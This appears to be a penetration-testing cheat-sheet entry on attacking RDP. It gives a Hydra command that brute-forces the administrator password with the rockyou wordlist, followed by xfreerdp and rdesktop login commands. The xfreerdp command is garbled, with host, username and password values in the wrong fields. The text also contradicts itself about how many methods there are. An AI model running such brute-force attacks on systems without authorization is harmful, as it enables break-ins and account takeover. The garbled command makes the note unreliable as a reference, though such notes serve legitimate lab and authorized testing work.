# RDP

There are two methods for this port: one involves finding credentials with another port, and the other employs brute force.

There is only one method to find credentials on this port, which involves a brute force attack using Hydra

    hydra -t 4 -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip

then further login with xfreerdp

    xfreerdp /v:noman /u:passwordnoman /p:192.168.10.10 /workarea /smart-sizing

    rdesktop $ip
